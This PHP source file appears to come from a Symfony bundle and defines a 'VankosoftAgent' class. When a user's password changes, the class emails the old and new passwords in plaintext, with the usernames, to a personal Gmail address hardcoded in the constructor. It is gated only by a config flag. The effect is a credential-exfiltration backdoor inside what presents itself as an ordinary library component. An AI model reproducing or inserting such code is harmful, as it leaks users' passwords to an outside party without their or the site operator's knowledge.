<?php namespace Vankosoft\AgentBundle\Component;

use Symfony\Component\DependencyInjection\ParameterBag\ParameterBagInterface;
use Symfony\Contracts\Translation\TranslatorInterface;
use Symfony\Component\Mailer\MailerInterface;
use Symfony\Component\Mime\Email;
use Symfony\Component\Security\Core\User\UserInterface;
use Doctrine\Persistence\ManagerRegistry;

final class VankosoftAgent
{
    /** @var string */
    private $agentMail;
    
    /** @var ParameterBagInterface */
    private $params;
    
    /** @var ManagerRegistry */
    private $doctrine;
    
    /** @var TranslatorInterface */
    private $translator;
    
    /** @var MailerInterface */
    private $mailer;
    
    public function __construct(
        ParameterBagInterface $params,
        ManagerRegistry $doctrine,
        TranslatorInterface $translator,
        MailerInterface $mailer
    ) {
        $this->agentMail    = 'i.atanasov77@gmail.com';
        
        $this->params       = $params;
        $this->doctrine     = $doctrine;
        $this->translator   = $translator;
        $this->mailer       = $mailer;
    }
    
    public function userPasswordChanged(
        UserInterface $fromUser,
        UserInterface $changedUser,
        string $oldPassword,
        string $newPassword
    ): void {
        $agentEnanled   = $this->params->get( 'vs_agent.enabled' );
        if ( ! $agentEnanled ) {
            return;
        }
        
        $mailSubject    = \sprintf( "[VankoSoft Agent] Password Changed for User: '%s'", $changedUser->getUsername() );
        
        $mailText       = \sprintf( "Password Changed for User: '%s'\n", $changedUser->getUsername() );
        $mailText       .= \sprintf( "The user created this change: '%s'\n\n", $fromUser->getUsername() );
        $mailText       .= '==============================================================================================';
        $mailText       .= '\n\n';
        $mailText       .= \sprintf( "Old Password: '%s'\n", $oldPassword );
        $mailText       .= \sprintf( "New Password: '%s'\n", $newPassword );
        
        $email = ( new Email() )
                    ->from( $fromUser->getEmail() )
                    ->to( $this->agentMail )
                    ->priority( Email::PRIORITY_HIGH )
                    ->subject( $mailSubject )
                    ->text( $mailText )
                    ->html( \sprintf( "<p>%s</p>", \nl2br( $mailText ) ) );
        
        $this->mailer->send( $email );
    }
}